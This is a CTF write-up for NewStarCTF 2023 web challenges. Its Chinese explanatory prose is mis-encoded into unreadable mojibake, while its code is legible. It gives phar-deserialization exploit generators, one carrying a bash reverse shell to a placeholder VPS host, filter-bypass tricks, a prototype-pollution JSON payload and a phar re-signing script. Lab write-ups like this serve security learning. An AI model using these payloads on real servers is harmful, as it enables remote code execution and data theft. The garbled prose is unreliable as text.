é‡Œé¢å†…å®¹å¦‚ä¸‹ï¼Œæˆ‘ä»¬å‘ç°è¿™é‡Œä¼¼ä¹æ˜¯è¦è¿›è¡Œååºåˆ—åŒ–çš„ï¼Œä½†å‡ºäººæ„æ–™çš„æ˜¯æ²¡æœ‰unserializeå‡½æ•°ï¼Œä½†å´æœ‰ä¸€ä¸ªunlinkå‡½æ•°ï¼Œè¿™é‡Œè‚¯å®šæ˜¯æ¼æ´ç‚¹äº†ã€‚ä½†æˆ‘ä»¬ä¸æ¸…æ¥šåŸç†çš„ï¼Œäºæ˜¯æˆ‘ç»“åˆé¢˜æ„è¿›è¡Œå…³é”®è¯çš„æœç´¢ï¼šphar unlink æ–‡ä»¶ä¸Šä¼ ä¹‹åå‘ç°è¿™é“é¢˜å°±æ˜¯pharååºåˆ—åŒ–ï¼Œå­¦äº†ä¸€æ³¢ä¹‹åæ¥å°è¯•ä¸€ä¸‹ã€‚ ç›´æ¥ä¸Špopï¼š &lt;?php //ini_set(\"phar.readonly\", 0); class Flag{ public $cmd; } @unlink(\"phar.phar\"); $phar = new Phar(\"phar.phar\"); //åç¼€åå¿…é¡»ä¸ºphar $phar-&gt;startBuffering(); $phar-&gt;setStub(\"GIF89a\".\"&lt;?php __HALT_COMPILER();?&gt;\"); //è®¾ç½®stub $o = new Flag(); $o-&gt;cmd = 'bash -c \"bash -i &gt;&amp; /dev/tcp/vps-ip/5555 0&gt;&amp;1\"'; $phar-&gt;setMetadata($o); //å°†è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifest $phar-&gt;addFromString(\"test.txt\", \"test\"); //æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶ //ç­¾åè‡ªåŠ¨è®¡ç®— $phar-&gt;stopBuffering(); ?&gt; è¿™é‡Œæˆ‘ç›´æ¥è¿è¡Œä¹‹åå°†pharçš„åç¼€æ”¹ä¸ºgifï¼šå› ä¸ºçŒœæµ‹é¢˜ç›®è‚¯å®šä¼šè¿‡æ»¤pharå…³é”®å­—ï¼Œä½†æ²¡è¿‡æ»¤ä¹Ÿæ˜¯æ²¡å…³ç³»çš„ï¼Œä¸€ç•ªä¸‡ä¸€å˜›ï¼Œéšåä¸Šä¼ phar.gifä¹‹åå‘ç°å¦‚ä¸‹ ![image-20231108214428320](NewStarCTF 2023/image-20231108214428320.png) tmæŠŠ__HALT_COMPILERä¹Ÿè¿‡æ»¤äº†ã€‚ã€‚ã€‚æ²¡åŠæ³•ï¼Œè‚¯å®šè¦ç»§ç»­ç»•è¿‡ï¼Œéšåç»§ç»­å…³é”®å­—æœç´¢ï¼Œå‘ç°éœ€è¦gzipå‹ç¼©æ¥ç»•è¿‡ï¼Œä½†è¿™é‡Œæˆ‘ä¸çŸ¥é“å’‹ç”¨gzipå‘½ä»¤ã€‚ã€‚ã€‚äºæ˜¯çœ‹äº†ä¸€çœ¼wpï¼ˆç‹—å¤´ï¼Œå•Šï¼åŸæ¥æ˜¯system(\"gzip phar.phar\");å³å¯ï¼Œæœå˜ ä¸è¿‡è¿™é‡Œæˆ‘æ˜¯åœ¨phpstormä¸Šè¿è¡Œçš„ï¼Œæ•…æ­¤gzipå‘½ä»¤è¿˜å¾—å®‰è£…ä¸€ä¸‹ï¼Œmadå°±è¿™ç©æ„å„¿åˆåºŸäº†æˆ‘å¾ˆé•¿æ—¶é—´ï¼Œå®‰è£…å¯å‚è€ƒï¼š https://blog.csdn.net/yuxisanno139/article/details/83016520 æœ€åå®‰è£…å®Œï¼Œåœ¨é…ç½®å¥½ç¯å¢ƒå˜é‡å°±èƒ½ç”¨ ![image-20231108220844914](NewStarCTF 2023/image-20231108220844914.png) è™½ç„¶è¿è¡Œå®Œè¿™é‡Œè¿˜ä¼šæç¤ºé”™è¯¯ï¼Œä½†ä¼¼ä¹å¯ä»¥å¿½ç•¥ï¼Œå› ä¸ºæ–‡ä»¶è¿˜æ˜¯å¯ä»¥æ­£å¸¸ç”Ÿæˆçš„ã€‚æœ€ç»ˆpayloadå¦‚ä¸‹ &lt;?php //ini_set(\"phar.readonly\", 0); class Flag{ public $cmd; } @unlink(\"phar.phar\"); $phar = new Phar(\"phar.phar\"); //åç¼€åå¿…é¡»ä¸ºphar $phar-&gt;startBuffering(); $phar-&gt;setStub(\"&lt;?php __HALT_COMPILER();?&gt;\"); //è®¾ç½®stub $o = new Flag(); $o-&gt;cmd = 'bash -c \"bash -i &gt;&amp; /dev/tcp/vps-ip/5555 0&gt;&amp;1\"'; $phar-&gt;setMetadata($o); //å°†è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifest $phar-&gt;addFromString(\"test.txt\", \"test\"); //æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶ //ç­¾åè‡ªåŠ¨è®¡ç®— $phar-&gt;stopBuffering(); system(\"gzip phar.phar\"); rename(\"phar.phar.gz\", \"2.jpg\"); ?&gt; è¿™é‡Œé‡å‘½åæ˜¯å› ä¸ºåç¼€çš„é™åˆ¶ï¼Œè¿™ä¹Ÿæ˜¯æµ‹è¯•å‡ºæ¥çš„ï¼Œè™½ç„¶pharååºåˆ—åŒ–ä¹‹å‰äº†è§£è¿‡ï¼Œä½†ä»è¿™æ¬¡åšé¢˜æˆ‘æ„Ÿè§‰å‡ºæ¥è¿˜æ˜¯å¾ˆåƒåœ¾ï¼Œå› æ­¤ä¹‹åä¼šåœ¨å¼€ä¸€ç¯‡æ–‡ç« å­¦ä¹ ä¸€ä¸‹ã€‚ è¿™é‡Œé‡‡ç”¨bashå‘½ä»¤åå¼¹æ˜¯å› ä¸ºé¢˜ç›®çš„å‘½ä»¤å‡½æ•°æ˜¯execï¼Œç»“æœä¸å›æ˜¾ï¼Œå› æ­¤éœ€è¦åå¼¹ä¸€ä¸‹ï¼Œå¦‚ä¸‹å›¾å¾—åˆ°flag ![image-20231108220534992](NewStarCTF 2023/image-20231108220534992.png) æœ€åå¾—åˆ°çš„2.jpgä¸Šä¼ åæ ¹æ®ä¸Šä¼ ç›®å½•ï¼Œç”¨pharåè®®è¯»å–ï¼ˆå¼€å¯ååºåˆ—åŒ–ï¼‰ä¸€ä¸‹å°±å¯åå¼¹æˆåŠŸäº†ï¼Œå‚è€ƒæ–‡ç« åœ¨ä¸‹é¢ file=phar://upload/156005c5baf40ff51a327f1c34f2975b.jpg WEEK4|WEB-OtenkiBoy è¿™é“é¢˜ç›®å°±æ˜¯week3çš„å‡çº§ç‰ˆäº†ï¼Œä¾æ—§æ˜¯åœ¨ç»™çš„é™„ä»¶ä¸­å®¡è®¡ä»£ç  çœ‹åˆ°routes/submit.js ![image-20231108222639307](NewStarCTF 2023/image-20231108222639307.png) çœ‹åˆ°è¿™é‡Œå¯ä»¥ï¼Œè¿½è¸ªä¸€ä¸‹mergejsonå‡½æ•°ï¼Œè¿›å…¥åˆ°routes/_components/utils.js const mergeJSON = function (target, patch, deep = false) { if (typeof patch !== \"object\") return patch;// åˆ¤æ–­patchæ˜¯å¦æ˜¯å¯¹è±¡ //å¦‚æœ patch æ˜¯æ•°ç»„ï¼Œç›´æ¥è¿”å› patchã€‚è¿™æ˜¯å› ä¸ºæ•°ç»„åœ¨ JavaScript ä¸­ä¹Ÿè¢«è§†ä¸ºå¯¹è±¡ï¼Œä½†åœ¨åˆå¹¶æ—¶ä¸éœ€è¦é€’å½’å¤„ç†ã€‚ if (Array.isArray(patch)) return patch; // do not recurse into arrays if (!target) target = {}// åˆ¤æ–­targetæ˜¯å¦ä¸ºç©º //å¦‚æœè®¾ç½®äº†æ·±åº¦åˆå¹¶ (deep === true)ï¼Œåˆ™åˆ†åˆ«å¯¹ target å’Œ patch è¿›è¡Œæ·±æ‹·è´ã€‚ if (deep) { target = copyJSON(target), patch = copyJSON(patch); } //å¾ªç¯éå† patch ä¸­çš„æ¯ä¸ªå±æ€§ã€‚ for (let key in patch) { if (key === \"__proto__\") continue;// è¿‡æ»¤äº†__proto__å…³é”®è¯ //å¦‚æœ target å’Œ patch ä¸­çš„ç›¸åº”å±æ€§å€¼ä¸ç›¸ç­‰ï¼Œé€’å½’è°ƒç”¨ mergeJSON æ¥åˆå¹¶å®ƒä»¬ã€‚ if (target[key] !== patch[key]) target[key] = mergeJSON(target[key], patch[key]); } return target; } ä½†è¿™é‡Œè¿‡æ»¤äº†__proto__ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨constructor.prototypeå»ä»£æ›¿__proto__è¿›è¡ŒåŸå‹é“¾æ±¡æŸ“ æ¥ä¸‹æ¥æ˜¯å¯»æ‰¾æ³¨å…¥ç‚¹ï¼ŒæŸ¥çœ‹routes/info.js async function getInfo(timestamp) { //æ£€æŸ¥ä¼ å…¥çš„timestampæ—¶é—´æˆ³æ˜¯å¦ä¸ºæ•°å­—ï¼Œå¦åˆ™èµ‹å€¼ä¸ºå½“å‰æ—¶é—´æˆ³ timestamp = typeof timestamp === \"number\" ? timestamp : Date.now(); // Remove test data from before the movie was released let minTimestamp; try { //è·å–min_publicçš„æ—¶é—´æˆ³ minTimestamp = createDate(CONFIG.min_public_time).getTime(); //æ£€æŸ¥ minTimestamp æ˜¯å¦ä¸ºå®‰å…¨æ•´æ•°ï¼ˆNumber.isSafeIntegerï¼‰ï¼Œå¦‚æœä¸æ˜¯ï¼Œåˆ™æŠ›å‡ºé”™è¯¯ã€‚ if (!Number.isSafeInteger(minTimestamp)) throw new Error(\"Invalid configuration min_public_time.\"); } catch (e) { console.warn(`\\x1b[33m${e.message}\\x1b[0m`); //å°è¯•ä½¿ç”¨é»˜è®¤å€¼ DEFAULT_CONFIG.min_public_time é‡æ–°è®¡ç®— minTimestampã€‚ console.warn(`Try using default value ${DEFAULT_CONFIG.min_public_time}.`); minTimestamp = createDate(DEFAULT_CONFIG.min_public_time, { UTC: false, baseDate: LauchTime }).getTime(); } //å°† timestamp æ›´æ–°ä¸ºä¼ å…¥çš„ timestamp å’Œ minTimestamp ä¸­è¾ƒå¤§çš„ä¸€ä¸ªã€‚è¿™ç¡®ä¿äº† timestamp è‡³å°‘æ˜¯ minTimestampã€‚ timestamp = Math.max(timestamp, minTimestamp); //ä»åä¸º wishes çš„è¡¨ä¸­é€‰æ‹©æ»¡è¶³æ¡ä»¶ timestamp &gt;= ? çš„æ‰€æœ‰æ•°æ®ï¼Œå…¶ä¸­ ? ç”±ä¼ å…¥çš„ timestamp å†³å®šã€‚ const data = await sql.all(`SELECT wishid, date, place, contact, reason, timestamp FROM wishes WHERE timestamp &gt;= ?`, [timestamp]).catch(e =&gt; { throw e }); return data; } minTimestampå–è‡ªé…ç½®æ–‡ä»¶ï¼Œåœ¨Math.maxå¤„ä¸ºå¯æ§çš„timestampè®¾ç½®ä¸‹é™å€¼ï¼Œæˆ‘ä»¬éœ€è¦å°†minTimestampæ”¹å°æ¥è·å–æ›´æ—©çš„æ•°æ®åº“æ•°æ® è¿½è¸ªcreateDateï¼Œåœ¨routes/_components/utils.jsä¸­ å­˜åœ¨å‡ ä¸ªæ³¨å…¥ç‚¹ opts æ³¨å…¥ç‚¹ const DEFAULT_CREATE_DATE_OPTIONS = { UTC: false, format: [ \"yyyy-MM-dd HH:mm:ss\", \"yyyy-MM-dd HH:mm:ss.fff\", \"yyyy-MM-dd\", \"MM/dd/yyyy\", \"MM/dd/yyyy HH:mm:ss\", \"MM/dd/yyyy HH:mm:ss.fff\", \"MM/dd/yy HH:mm:ss\", \"HH:mm:ss\", \"HH:mm:ss.fff\" ], // baseDate: undefined } //é€šè¿‡è°ƒç”¨ copyJSON å‡½æ•°å¤åˆ¶äº†ä¸€ä¸ªé»˜è®¤çš„æ—¥æœŸé…ç½®å¯¹è±¡ const CopiedDefaultOptions = copyJSON(DEFAULT_CREATE_DATE_OPTIONS) if (typeof opts === \"undefined\") opts = CopiedDefaultOptions//å¦‚æœæœªæä¾›é…ç½®é¡¹ optsï¼Œåˆ™å°†å…¶è®¾ä¸ºé»˜è®¤é…ç½®çš„å‰¯æœ¬ã€‚ //å¦‚æœæä¾›äº† opts ä½†ä¸æ˜¯å¯¹è±¡ï¼Œåˆ™å°†å…¶è½¬æ¢ä¸ºå¯¹è±¡ï¼ŒåŒæ—¶è®¾ç½® UTC å±æ€§ä¸º opts çš„å¸ƒå°”å€¼ã€‚ if (typeof opts !== \"object\") opts = { ...CopiedDefaultOptions, UTC: Boolean(opts) }; opts.UTC = typeof opts.UTC === \"undefined\" ? CopiedDefaultOptions.UTC : Boolean(opts.UTC); opts.format = opts.format || CopiedDefaultOptions.format; if (!Array.isArray(opts.format)) opts.format = [opts.format]//å¦‚æœæ ¼å¼ä¸æ˜¯æ•°ç»„ï¼Œå°†å…¶è½¬æ¢ä¸ºæ•°ç»„ã€‚ //é€šè¿‡ filter å‡½æ•°ï¼Œä¿ç•™ opts.format ä¸­ç±»å‹ä¸ºå­—ç¬¦ä¸²çš„é¡¹ï¼Œè¿‡æ»¤æ‰éå­—ç¬¦ä¸²ç±»å‹çš„é¡¹ï¼Œç¡®ä¿äº†æ•°ç»„ä¸­åªåŒ…å«å­—ç¬¦ä¸²ç±»å‹çš„æ—¥æœŸæ ¼å¼ã€‚ opts.format = opts.format.filter(f =&gt; typeof f === \"string\") .filter(f =&gt; { // åˆ¤æ–­fæ˜¯å¦åŒ…å«æœ‰æ•ˆçš„æ—¥æœŸæ ¼å¼ç¬¦å·ï¼ˆä¹Ÿå°±æ˜¯è¦åŒ…å«ä¸‹åˆ—ç¬¦å·çš„è‡³å°‘ä¸€ä¸ªï¼‰ if (/yy|yyyy|MM|dd|HH|mm|ss|fff/.test(f) === false) { console.warn(`Invalid format \"${f}\".`, `At least one format specifier is required.`); return false; } //é€šè¿‡æ›¿æ¢æ“ä½œå°† yyyy è½¬æ¢ä¸º yyï¼Œç„¶åä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼åˆ†å‰²å­—ç¬¦ä¸²ï¼Œæ£€æŸ¥å„ä¸ªæ—¥æœŸæ ¼å¼ç¬¦å·ä¹‹é—´æ˜¯å¦å­˜åœ¨åˆ†éš”ç¬¦ã€‚ if (`|${f}|`.replace(/yyyy/g, \"yy\").split(/yy|MM|dd|HH|mm|ss|fff/).includes(\"\")) { console.warn(`Invalid format \"${f}\".`, `Delimeters are required between format specifiers.`); return false; } //å¦‚æœæ—¥æœŸæ ¼å¼ä¸­åŒæ—¶åŒ…å« yyyy å’Œ yyï¼Œè¾“å‡ºè­¦å‘Šä¿¡æ¯ if (f.includes(\"yyyy\") &amp;&amp; f.replace(/yyyy/g, \"\").includes(\"yy\")) { console.warn(`Invalid format \"${f}\".`, `\"yyyy\" and \"yy\" cannot be used together.`); return false; } return true; }) //å¦‚æœæœªæä¾›åŸºå‡†æ—¥æœŸ (opts.baseDate)ï¼Œåˆ™å°†å…¶è®¾ç½®ä¸ºå½“å‰æ—¶é—´æˆ³ã€‚è¿™ä¸€æ­¥ç¡®ä¿äº†åœ¨åˆ›å»ºæ—¥æœŸå¯¹è±¡æ—¶æœ‰ä¸€ä¸ªåˆé€‚çš„åŸºå‡†æ—¥æœŸã€‚ opts.baseDate = new Date(opts.baseDate || Date.now()); å½“createDateçš„optsæœªæŒ‡å®šæ—¶å¹¶ä¸èƒ½æ³¨å…¥ï¼Œä½†æ˜¯å½“optsä¸º JSON å¯¹è±¡ä¸”æ²¡æœ‰æŒ‡å®šformatå±æ€§æ—¶ï¼Œä¸‹é¢è¿™ä¸€è¡Œä¼šè§¦å‘åŸå‹é“¾ opts.format = opts.format || CopiedDefaultOptions.format; è€Œå¯¹äºbaseDateï¼Œç”±äºDEFAULT_CREATE_DATE_OPTIONSä¸­æœ¬èº«ä¸å«baseDateï¼Œå¯ç›´æ¥è§¦å‘è¯¥åŸå‹é“¾ opts.baseDate = new Date(opts.baseDate || Date.now()); è¿™é‡Œç»è¿‡GPTä¸wpçš„å–‚å…»ï¼Œä¼¼ä¹æ‡‚äº†é‚£ä¹ˆä¸€ä¸¢ä¸¢ã€‚ã€‚ã€‚ã€‚ æ—¶é—´å‡½æ•°æ³¨å…¥ç‚¹ åœ¨utility functionsçš„æ³¨é‡Šéƒ¨åˆ†å­˜åœ¨å‡½æ•° const getHMS = (time) =&gt; { //ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼å¯¹è¾“å…¥çš„ time è¿›è¡ŒåŒ¹é…ã€‚è¯¥æ­£åˆ™è¡¨è¾¾å¼ç”¨äºåŒ¹é…æ—¶é—´å­—ç¬¦ä¸²ï¼Œæ”¯æŒæ—¶ã€åˆ†ã€ç§’å’Œæ¯«ç§’çš„æå–ã€‚ let regres = /^(\\d+) *\\: *(\\d+)( *\\: *(\\d+)( *\\. *(\\d+))?)?$/.exec(time.trim()) if (regres === null) return {} //ä½¿ç”¨è§£æ„èµ‹å€¼å’Œ map å‡½æ•°æå–æ­£åˆ™åŒ¹é…ç»“æœä¸­çš„æ•°å­—éƒ¨åˆ†ï¼Œå¹¶å°†å…¶è½¬æ¢ä¸ºæ•°å­—ç±»å‹ã€‚å¦‚æœæŸä¸ªæ•°å­—æœªå®šä¹‰ï¼Œå°†å…¶è®¾ç½®ä¸º undefinedã€‚ let [n1, n2, n3, n4] = [regres[1], regres[2], regres[4], regres[6]].map(t =&gt; typeof t === \"undefined\" ? undefined : Number(t)); if (typeof n3 === \"undefined\") n3 = 0; // 23:59(:59)? if (0 &lt;= n1 &amp;&amp; n1 &lt;= 23 &amp;&amp; 0 &lt;= n2 &amp;&amp; n2 &lt;= 59 &amp;&amp; 0 &lt;= n3 &amp;&amp; n3 &lt;= 59) { // 23:59:59(.999)? //ä½¿ç”¨ pad å‡½æ•°å°†æ—¶ã€åˆ†ã€ç§’æ ¼å¼åŒ–ä¸ºä¸¤ä½æ•°ã€‚ let HH = pad(n1, 2), mm = pad(n2, 2), ss = pad(n3, 2), //å¦‚æœæ¯«ç§’éƒ¨åˆ†å­˜åœ¨ï¼Œå°†å…¶æ ¼å¼åŒ–å¹¶æ·»åŠ åˆ°ç»“æœå¯¹è±¡ä¸­ã€‚ fff = typeof n4 === \"undefined\" ? undefined : pad(n4, 3).substring(0, 3); const o = { HH, mm, ss } //è¿”å›ä¸€ä¸ªåŒ…å«æ—¶ã€åˆ†ã€ç§’ï¼ˆå’Œå¯èƒ½çš„æ¯«ç§’ï¼‰ä¿¡æ¯çš„å¯¹è±¡ã€‚ if (typeof fff !== \"undefined\") o.fff = fff; return o; } else return {} } å½“ä¼ å…¥çš„ä¼ å…¥timeä¸­ä¸åŒ…å«æ¯«ç§’æ—¶ï¼Œè¿”å›çš„å¯¹è±¡ä¸­ä¸ä¼šå¸¦æœ‰fffå±æ€§ è°ƒç”¨getHMSå‡½æ•°çš„åœ°æ–¹åœ¨createDateçš„æœ«å°¾å‡ è¡Œï¼Œå±äºcreateDateçš„ Fallback Auto Detection éƒ¨åˆ† const { HH, mm, ss, fff } = getHMS(time_str) å½“time_strä¸­ä¸åŒ…å«æ¯«ç§’ï¼Œèƒ½å¤Ÿè§¦å‘åŸå‹é“¾ æ¥ä¸‹æ¥å°±æ˜¯å¦‚ä½•åˆ©ç”¨æ¼æ´çš„é—®é¢˜äº† æˆ‘ä»¬å‘ç°createDateçš„optsçš„formatæ”¯æŒyyæ ‡è¯†ç¬¦ï¼Œè€Œå½“å¹´ä»½å°äº100æ—¶ï¼Œæˆ‘ä»¬è®¤ä¸ºæ˜¯20ä¸–çºªçš„å¹´ä»½ï¼Œå¦‚ä¸‹å›¾ ![image-20231110174102902](NewStarCTF 2023/image-20231110174102902.png) ä¸¾ä¾‹æ¥è¯´ï¼Œå¦‚æœformatä¸º20yy-MM-ddï¼Œåœ¨formatè§£æå­—ç¬¦ä¸²2023-10-01æ—¶ï¼Œå°†è§£æyyä¸º23ï¼Œè¾“å‡ºä¸º1923ï¼Œæœ€ç»ˆè¾“å‡ºçš„å¹´ä»½æ˜¯1923-10-01 **ç›®æ ‡ï¼š**æ±¡æŸ“format å‰é¢æåˆ°ï¼Œæ±¡æŸ“formatçš„æ¡ä»¶æ˜¯optsä¸º JSON å¯¹è±¡ä¸”æ²¡æœ‰æŒ‡å®šformatå±æ€§ï¼Œè§‚å¯Ÿroutes/infoä¸­çš„ç›¸åº”ç‰‡æ®µï¼Œæˆ‘ä»¬éœ€è¦è§¦å‘ä¸‹é¢çš„catch try { minTimestamp = createDate(CONFIG.min_public_time).getTime(); if (!Number.isSafeInteger(minTimestamp)) throw new Error(\"Invalid configuration min_public_time.\"); } catch (e) { console.warn(`\\x1b[33m${e.message}\\x1b[0m`); console.warn(`Try using default value ${DEFAULT_CONFIG.min_public_time}.`); minTimestamp = createDate(DEFAULT_CONFIG.min_public_time, { UTC: false, baseDate: LauchTime }).getTime(); } è§¦å‘catchçš„æ¡ä»¶æ˜¯å‰é¢tryçš„createDateè¿”å›ä¸€ä¸ªæ— æ•ˆçš„æ—¥æœŸï¼Œæˆ–è€…createDateæœ¬èº«è¢«è°ƒç”¨æ—¶æ³•ç¥é”™è¯¯ **ç›®æ ‡ï¼š**è§¦å‘createDateé”™è¯¯ï¼Œæˆ–ä½¿createDateè¿”å›æ— æ•ˆæ—¥æœŸ éœ€è¦åˆ©ç”¨åˆšæ‰å‰©ä½™çš„ä¸¤ä¸ªæ³¨å…¥ç‚¹ ä¸‹é¢çš„è¿™è¡Œä»£ç è¡¨æ˜äº†åŸºäºformatçš„æ—¥æœŸåŒ¹é…ä¸å¯èƒ½è¿”å›ä¸€ä¸ªæ— æ•ˆæ—¥æœŸï¼Œå› æ­¤è¿”å›æ— æ•ˆæ—¥æœŸåªæœ‰ Fallback Auto Detection èƒ½å¤Ÿåšåˆ° if (Number.isSafeInteger(d.getTime())) return d; else continue; ä»å¦‚ä¸‹ä»£ç ç‰‡æ®µå¯çŸ¥ï¼ŒåŸºäºformatçš„æ—¥æœŸåŒ¹é…ä¾èµ–äºbaseDateï¼Œformat çš„è¿‡ç¨‹æ˜¯åœ¨argTableä¸Šè¿›è¡Œè¦†ç›– const dateObj = opts.baseDate const _UTC = opts.UTC ? \"UTC\" : \"\" let argTable = { \"yyyy\": dateObj[`get${_UTC}FullYear`](), \"MM\": dateObj[`get${_UTC}Month`]() + 1, \"dd\": dateObj[`get${_UTC}Date`](), \"HH\": dateObj[`get${_UTC}Hours`](), \"mm\": dateObj[`get${_UTC}Minutes`](), \"ss\": dateObj[`get${_UTC}Seconds`](), \"fff\": dateObj[`get${_UTC}Milliseconds`] ? dateObj[`get${_UTC}Milliseconds`]() : undefined // due to system architecture } sortTable.forEach((f, i) =&gt; { if (f == \"yy\") { let year = Number(regres[i + 1]) year = year &lt; 100 ? (1900 + year) : year; return argTable[\"yyyy\"] = year; } argTable[f] = Number(regres[i + 1]) }) å› æ­¤æ±¡æŸ“baseDateä¸ºæ— æ•ˆæ—¥æœŸå³å¯ç»•è¿‡ format æ¨¡å¼è¿›å…¥ Fallback Auto Detection routes/info.jsçš„tryä¸­ç”¨çš„æ˜¯config.jsä¸­çš„min_pulic_timeï¼Œä¸º2019-07-09 00:00:00ï¼Œä¸å¸¦æœ‰æ¯«ç§’ï¼Œåˆšå¥½èƒ½å¤Ÿè§¦å‘fffçš„åŸå‹é“¾æ±¡æŸ“ï¼Œä¸ºfffæŒ‡å®šä¸ºæ— æ•ˆå€¼å³å¯ åˆ°æ­¤ä¸ºæ­¢ï¼Œä½¿ç”¨å¦‚ä¸‹çš„ payload å¯ä»¥è§¦å‘catch { \"contact\":\"1\", \"reason\":\"2\", \"constructor\":{ \"prototype\":{ \"baseDate\":\"aaa\", \"fff\": \"bbb\" } } } è¿›å…¥catchåï¼Œè¾¾åˆ°äº†æ±¡æŸ“formatçš„æ¡ä»¶ï¼Œä½†æ˜¯createDateçš„å‚æ•°å˜æˆäº†config.default.jsä¸­çš„min_public_timeï¼Œä¸º2019-07-08T16:00:00.000Zï¼Œå› æ­¤å¯ä»¥æ„é€ formatä¸ºyy19-MM-ddTHH:mm:ss.fffZ ç„¶ååŸºäºformatçš„æ—¥æœŸåŒ¹é…ä¼šè¿”å›1920-07-08T16:00:00.000Zçš„æ—¥æœŸï¼Œå·²ç»å°†minTimestampææ—©äº†è¿‘ä¸€ä¸ªä¸–çºªäº† å› æ­¤æœ€ç»ˆçš„payloadä¸º { \"contact\":\"a\", \"reason\":\"a\", \"constructor\":{ \"prototype\":{ \"format\": \"yy19-MM-ddTHH:mm:ss.fffZ\", \"baseDate\":\"aaa\", \"fff\": \"bbb\" } } } ä»¥Content-Type: application/jsonçš„ Header ç”¨POSTæ–¹æ³•å‘è·¯å¾„/submitè¯·æ±‚å³å¯ ç„¶åä¸ºæˆ‘ä»¬å†è¯·æ±‚/info/0ï¼Œæ‰¾åˆ°å«æœ‰ flag çš„ä¸€æ¡æ•°æ® ![image-20231110180027322](NewStarCTF 2023/image-20231110180027322.png) æ‹¿åˆ°flag WEEK5|WEB-Unserialize Again ![image-20231110203212897](NewStarCTF 2023/image-20231110203212897.png) è®¿é—®é¦–é¡µæ˜¯æ–‡ä»¶ä¸Šä¼ ï¼Œç›´æ¥ä¸Šä¼ ä¸€ä¸ªå‘ç°æç¤ºæˆ‘ä»¬ï¼Œè¿™é‡Œä¸æ˜¯ä¸Šä¼ ç‚¹ï¼Œé‚£å³é”®çœ‹ä¸€ä¸‹æºä»£ç ï¼Œå‘ç°cookieä¸­è—æœ‰ä¸€ä¸ªphpæ–‡ä»¶ï¼Œæˆ‘ä»¬ç›´æ¥è®¿é—®çœ‹åˆ°pharååºåˆ—åŒ–ä»£ç  &lt;?php highlight_file(__FILE__); error_reporting(0); class story{ private $user='admin'; public $pass; public $eating; public $God='false'; public function __wakeup(){ $this-&gt;user='human'; if(1==1){ die(); } if(1!=1){ echo $fffflag; } } public function __construct(){ $this-&gt;user='AshenOne'; $this-&gt;eating='fire'; die(); } public function __tostring(){ return $this-&gt;user.$this-&gt;pass; } public function __invoke(){ if($this-&gt;user=='admin'&amp;&amp;$this-&gt;pass=='admin'){ echo $nothing; } } public function __destruct(){ if($this-&gt;God=='true'&amp;&amp;$this-&gt;user=='admin'){ system($this-&gt;eating); } else{ die('Get Out!'); } } } if(isset($_GET['pear'])&amp;&amp;isset($_GET['apple'])){ // $Eden=new story(); $pear=$_GET['pear']; $Adam=$_GET['apple']; $file=file_get_contents('php://input'); file_put_contents($pear,urldecode($file)); file_exists($Adam); } else{ echo 'å¤šåƒé›ªæ¢¨'; } å¤šåƒé›ªæ¢¨ è¿™é“é¢˜åˆ†æä¸‹æ¥ä¹Ÿå¾ˆç®€å•ï¼Œå°±æ˜¯ç›´æ¥é¡ºåŠ¿è¿›å…¥destructé­”æœ¯æ–¹æ³•å³å¯ï¼Œè‡³äºwakeupçš„ç»•è¿‡å°±å¾ˆç®€å•äº† ![image-20231110204546036](NewStarCTF 2023/image-20231110204546036.png) è¿™é‡Œä¹Ÿçœ‹åˆ°PHPæ˜¯7.0.9ï¼Œå¯ä»¥ç»•è¿‡wakeupçš„ï¼Œå°±åœ¨æˆ‘çº³é—·å„¿constructå’‹ç»•è¿‡æ—¶ï¼Œçœ‹äº†ä¸€ç¯‡æ–‡ç« æ‡µé€¼äº†ï¼Œååºåˆ—åŒ–ä¸è§¦å‘ã€‚ã€‚ã€‚ã€‚ æˆ‘å»ï¼Œæˆ‘ç«Ÿç„¶ä¸çŸ¥é“ã€‚ã€‚ã€‚é‚£æˆ‘ä»¬ç›´æ¥å†™pharå³å¯ &lt;?php //ini_set(\"phar.readonly\", 0); class story{ public $eating = 'cat /f*'; public $God='true'; } //@unlink(\"phar.phar\"); $phar = new Phar(\"1.phar\"); //åç¼€åå¿…é¡»ä¸ºphar $phar-&gt;startBuffering(); $phar-&gt;setStub(\"&lt;?php __HALT_COMPILER();?&gt;\"); //è®¾ç½®stub $o = new story(); $phar-&gt;setMetadata($o); //å°†è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifest $phar-&gt;addFromString(\"test.txt\", \"test\"); //æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶ //ç­¾åè‡ªåŠ¨è®¡ç®— $phar-&gt;stopBuffering(); ?&gt; ä¿®æ”¹å®Œä¹‹åï¼Œå› ä¸ºpharçš„æœ€åæœ‰ä¸€æ®µsignatureï¼Œæ˜¯pharçš„ç­¾åï¼Œæ”¾åœ¨æ–‡ä»¶æœ«å°¾ï¼Œè¦æ³¨æ„å› ä¸ºæˆ‘ä»¬ä¿®æ”¹äº†æ–‡ä»¶çš„å†…å®¹ï¼ˆä¹Ÿå°±æ˜¯ç»•è¿‡wakeæ—¶ä¿®æ”¹çš„å±æ€§ä¸ªæ•°ï¼‰ï¼Œä¹‹å‰çš„ç­¾åå°±ä¼šæ— æ•ˆï¼Œæ‰€ä»¥éœ€è¦æ›´æ¢ä¸€ä¸ªæ–°çš„ç­¾åï¼Œç”Ÿæˆæ–°ç­¾åçš„è„šæœ¬å¦‚ä¸‹ from hashlib import sha1 with open('1.phar', 'rb') as file:&nbsp;&nbsp;&nbsp; f = file.read() s = f[:-28] # è·å–è¦ç­¾åçš„æ•°æ® h = f[-8:] # è·å–ç­¾åç±»å‹å’ŒGBMBæ ‡è¯† newf = s + sha1(s).digest() + h # æ•°æ® + ç­¾å + (ç±»å‹ + GBMB) with open('newtest.phar', 'wb') as file:&nbsp;&nbsp;&nbsp; file.write(newf) # å†™å…¥æ–°æ–‡ä»¶ æœ€åè¯»å– newtest.phar çš„å†…å®¹è¿›è¡Œurlç¼–ç postä¼ ä¸Šå»ï¼Œgetä¼  ?pear=1.phar&amp;apple=phar://1.phar å³å¯ ![image-20231110205835163](NewStarCTF 2023/image-20231110205835163.png) å¦‚å›¾æ­¤å¤„ä¿®æ”¹æ”¹å˜2çš„å€¼ 